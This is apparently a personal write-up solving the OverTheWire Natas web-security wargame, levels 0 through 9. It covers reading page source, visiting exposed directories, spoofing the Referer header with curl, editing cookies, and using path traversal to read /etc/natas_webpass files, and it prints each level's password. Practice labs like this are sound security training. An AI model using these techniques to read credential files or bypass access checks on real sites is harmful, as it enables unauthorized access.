# overthewire.org

I'm trying to solve the challenges of overthewire.org.

<!-- Note, Tip, Important, Warning, Caution -->

> [!Important] 
> The description of each step is essentially derived from the previous step. For example, the solution to Natas1 is something that must be found in Natas0.

- All user is name of levels

        http://natas`X`.natas.labs.overthewire.org/

        user:natas`X`
        pass:*******

## natas0

- He himself gave us the username and password in overthewire.org for start HACKGAME.

        user:natas0
        pass:natas0

## natas1

in : http://natas0.natas.labs.overthewire.org/

1. Get the page's source.
2. Look the HTML comment.

        <!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->

## natas2

in : http://natas1.natas.labs.overthewire.org/

- You cannot right-click.
1. Get the page's source.
2. Look the HTML comment.

        <!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->

## natas3

in : http://natas2.natas.labs.overthewire.org/

- There is nothing in the page's source.
1. Get the page's source.
2. In source you can find .

        <img src="files/pixel.png">

3. So we have a path named `files/` and access to that path is not blocked.
        
    in this path you can find : `users.txt`

        # username:password
        alice:BYNdCesZqW
        bob:jw2ueICLvT
        charlie:G5vCxkVV3m
        natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH <-| The password is here.
        eve:zo4mJWyNj2
        mallory:9urtcpzBmH

## natas4

in : http://natas3.natas.labs.overthewire.org/

- he have comment in page's source

        <!-- Not even Google will find it this time... -->

1. Sites often use a ‍‍‍‍‍‍‍‍`robots.txt` file in root of site to tell search engines what files and paths they should not see.

        http://natas3.natas.labs.overthewire.org/robots.txt

    in this file you can find a path : `/s3cr3t/`

2. go to : `http://natas3.natas.labs.overthewire.org/s3cr3t/`

    in this path you can find : `users.txt`

        natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

## natas5

in : http://natas4.natas.labs.overthewire.org/

- he has a text message :

        You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

1. When you click `Reload Page`, the message changes to this :

        Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

    you need change `Referer` HTTP header

2. for change referer http header, i use `curl`

    i run `TERMINAL`

        curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org

    tada :

        Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

## natas6

in : http://natas5.natas.labs.overthewire.org/

- he has a text message :

        Access disallowed. You are not logged in

1. Okay. Matt's login information must be stored somewhere.

    So first I went to check the `storage`, I'm using `Chrome`.

2. Pressing the `F12` button in Google Chrome opens the developer tools, in the `Application` tab, I look for something in storage and found it in the `Cookies` section.
   
        loggedin : 0

3. cheange loggedin to `1` and refresh.

        Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## natas7

in : http://natas6.natas.labs.overthewire.org/

- By clicking on `View sourcecode` a PHP script is shown

        <?
        include "includes/secret.inc";

        if(array_key_exists("submit", $_POST)) {
                if($secret == $_POST['secret']) {
                print "Access granted. The password for natas7 is <censored>";
            } else {
                print "Wrong secret";
            }
        }
        ?>

1. This code tells the ‍`$_POST['secret']` parameter to be checked against the `$secret` variable, and `$secret` itself is located in the `includes/secret.inc` file.

   just open `http://natas6.natas.labs.overthewire.org/includes/secret.inc`

        <?
        $secret = "FOEIUWGHFEEUHOFUOIU";
        ?>

2. now submit form with Input secret: `FOEIUWGHFEEUHOFUOIU`

   - you can submit with: `curl`

    > curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" -X POST http://natas6.natas.labs.overthewire.org/

    see :

        Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## natas8

in : http://natas7.natas.labs.overthewire.org/

- he have comment in page's source

        <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

1. According to the links, the pages are called as follows: `index.php?page=home`
   
2. So we change the value of ‍`page=home` to `page=/etc/natas_webpass/natas8`.

        http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

   - pass is here : `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

## natas9

in : http://natas8.natas.labs.overthewire.org/

- By clicking on `View sourcecode` a PHP script is shown

        <?
        $encodedSecret = "3d3d516343746d4d6d6c315669563362";

        function encodeSecret($secret) {
            return bin2hex(strrev(base64_encode($secret)));
        }

        if(array_key_exists("submit", $_POST)) {
            if(encodeSecret($_POST['secret']) == $encodedSecret) {
            print "Access granted. The password for natas9 is <censored>";
            } else {
            print "Wrong secret";
            }
        }
        ?>

1. What these commands say is that the value of `secret` must be equal to the encrypted value `3d3d516343746d4d6d6c315669563362` or `$encodedSecret`.

- On the other hand, it encrypts the value we send with the `encodeSecret` function `bin2hex(strrev(base64_encode($secret)))`, so we just need to reverse the encryption steps.

- To do this, first we extract the value `3d3d516343746d4d6d6c315669563362` from hex `hex2bin()`, then we need to write all the letters in reverse with `strrev()` and decode it with base64 with the `base64_decode()` function.

2. To do this, if you don't have `php`, you can use online compilers and run the following code to get the secret.

        <?php
        $secret = "3d3d516343746d4d6d6c315669563362";
        echo base64_decode(strrev(hex2bin($secret))) ;
        ?>

    - This program returns the result: `oubWYf2kBq`
  
3. Now you can enter it as the `secret` value.

   - you can submit with: `curl`

    > curl -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -d "secret=oubWYf2kBq&submit=submit" -X POST http://natas8.natas.labs.overthewire.org/

    You found it:

        Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## natas10

in : http://natas9.natas.labs.overthewire.org/
